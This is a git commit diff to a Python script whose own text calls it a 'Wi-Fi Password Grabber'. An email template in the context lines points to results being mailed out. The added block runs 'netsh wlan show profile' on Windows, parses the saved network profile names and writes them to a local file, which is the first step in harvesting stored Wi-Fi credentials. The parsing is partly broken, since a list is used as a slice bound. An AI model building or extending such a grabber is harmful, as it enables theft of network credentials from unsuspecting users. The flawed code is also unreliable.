fc4cd985f4baccc9ea4aed02d09d5d0132951c3b
Archisman Karmakar <92569441+ArchismanKarmakar@users.noreply.github.com>
2023-05-06 12:00:24 +0530

    word block searching in module added, pass 3

--- main.py
+++ main.py
@@ -44,3 +44,32 @@ Subject: Hi Mailtrap
 To: {receiver}
 From: {sender}
 Wi-Fi Password Grabber by Archisman Karmakar.\n"""
+
+
+if os.name == "nt":
+    # os.system("cls")
+    output = subprocess.check_output("netsh wlan show profile", shell=True)
+    # output = output.decode("utf-8")
+    # output = output.split()
+    # print(output)
+    output = str(output)
+    start = output.find("Profile :")
+    end = output.split("\\r\\n")
+    substring = output[start:end]
+    words_list = output.split()
+    jungkook = 2
+    with open(file_path + "\\" + sys_info, "w") as f:
+        f.write("All reg conns: \n")
+        f.close()
+    for wordblk in output.split():
+        if wordblk == "Profile":
+            next_word = words_list[words_list.index(wordblk) + jungkook]
+            next_word = next_word.split("\\r\\n")[0]
+            knj = jungkook+1
+            try:
+                while "All" not in next_word:
+                    next_word += " " + words_list[words_list.index(wordblk) + knj]
+                    knj += 1
+            except:
+                pass
+
